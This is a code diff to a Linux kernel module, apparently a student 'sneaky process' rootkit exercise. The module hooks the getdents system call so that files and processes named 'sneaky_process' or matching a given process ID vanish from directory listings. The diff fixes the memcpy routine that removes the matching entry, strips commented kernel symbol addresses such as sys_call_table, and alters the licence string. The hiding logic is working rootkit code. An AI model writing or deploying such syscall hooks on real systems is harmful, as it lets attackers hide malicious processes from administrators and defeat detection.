@@ -1,8 +1,3 @@
-//ffffffff81071fc0 T set_pages_ro
-//ffffffff81072040 T set_pages_rw
-//ffffffff81a00200 R sys_call_table
-
-
 #include <linux/module.h>      // for all modules
 #include <linux/init.h>        // for entry/exit macros
 #include <linux/kernel.h>      // for printk and other kernel bits
@@ -23,7 +18,7 @@
 
 
 #define BUFFLEN 512
-MODULE_LICENSE("GPL");
+MODULE_LICENSE("rg239");
 
 
 static char * sneaky_process_id = "";
@@ -86,16 +81,17 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
     int current_position = 0;
     int current_reclen,  length;
 
-    while(current_position < num){
+    while(current_position < num && current_position >= 0){
 
       current_dir = (struct linux_dirent *)(current_position + (char*)dirp);
       current_reclen = current_dir->d_reclen;
 
       if((strcmp(current_dir->d_name, "sneaky_process") == 0) || (strcmp(current_dir->d_name, sneaky_process_id) == 0)){
 
+        length  = num - (size_t)(((char *)current_dir + current_dir->d_reclen) - (char*)dirp);
+        memcpy(current_dir, (char*)current_dir + current_dir->d_reclen, length);
 	num = num - current_reclen;
-        length  = (size_t)(((char *)current_dir + current_reclen) - (char*)dirp);
-        memcpy(current, (char*)current_dir + current_reclen, length);
+	break;
       }
       current_position = current_position + current_reclen;
     }
